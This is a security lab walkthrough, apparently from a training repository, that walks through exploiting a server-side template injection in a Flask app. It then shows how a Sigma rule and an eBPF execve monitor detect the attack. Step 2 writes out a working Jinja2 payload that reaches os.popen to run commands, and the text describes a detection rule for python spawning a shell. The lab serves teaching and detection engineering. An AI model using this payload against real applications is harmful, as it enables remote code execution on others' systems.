# Scenario 1: Cloud-Native RCE via Server-Side Template Injection (SSTI)

This scenario demonstrates a modern (2026) attack path against a Python/Flask web application and how Enterprise Detection teams catch it using eBPF and Sigma rules.

## The Goal
Exploit an insecure `render_template_string` implementation to gain Remote Code Execution (RCE) on the container, and then observe the detection mechanisms.

## Step 1: Spin Up the Lab
Start the target environment and the attacker node using Docker Compose.
```bash
cd lab_infra
docker-compose up -d
```

## Step 2: The Attack (Adversary Emulation)
Access the attacker node:
```bash
docker-compose exec attacker_node bash
```

From the attacker node, interact with the vulnerable endpoint:
```bash
# 1. Normal interaction
curl "http://target_app:5000/vuln_ssti?name=Student"

# 2. Testing for Template Injection
curl "http://target_app:5000/vuln_ssti?name={{7*7}}"
# If the output says "Welcome, 49!", the application is evaluating Jinja2 expressions!

# 3. Achieving RCE (Remote Code Execution)
# We traverse the Python MRO (Method Resolution Order) to find the 'os' module and execute 'id'
curl "http://target_app:5000/vuln_ssti?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
```

## Step 3: The Defense (Detection Engineering)
If an attacker gets RCE, how do we know?

### A. The Sigma Approach (SIEM/Log based)
Look at `detection/sigma_rules/sysmon_suspicious_child.yml`. 
When the attacker executed `popen('id')`, the `python` process spawned `sh` or `id`. The Sigma rule defines exactly this behavior: "If Image ends with 'sh' and ParentImage is 'python', trigger a HIGH severity alert."

### B. The eBPF Approach (Kernel-level runtime)
While the attacker might try to hide their process or clear logs, they cannot hide from the kernel.
Run the eBPF monitor on the host machine (requires root and Linux headers):
```bash
sudo python3 detection/ebpf_monitor/execve_hook.py
```
When the exploit runs, eBPF intercepts the `execve` syscall and you will see the exact command (`id` or `sh`) popping up in real-time, bypassing any user-space obfuscation.
